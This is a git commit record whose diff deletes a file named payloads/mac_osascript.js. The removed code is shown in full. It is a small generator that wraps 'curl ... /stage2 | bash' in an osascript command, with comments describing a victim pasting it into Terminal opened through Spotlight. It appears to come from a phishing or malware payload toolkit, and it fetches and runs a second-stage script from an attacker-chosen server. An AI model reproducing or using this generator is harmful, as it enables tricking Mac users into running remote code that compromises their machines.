3655ac9ba0b214ef7b6796b2fc0653dd32394727
Anonymous 🎭 <157519745+anonymous-beta@users.noreply.github.com>
2026-08-02 10:04:56 +0100

    Delete payloads/mac_osascript.js

--- payloads/mac_osascript.js
+++
@@ -1,8 +0,0 @@
-function generate(token, serverUrl) {
-    // osascript to run shell command via Terminal
-    // User pastes into Terminal after opening via Spotlight
-    const cmd = `curl -s ${serverUrl}/stage2 | bash`;
-    return `osascript -e 'do shell script "${cmd}"'`;
-}
-
-module.exports = { generate };
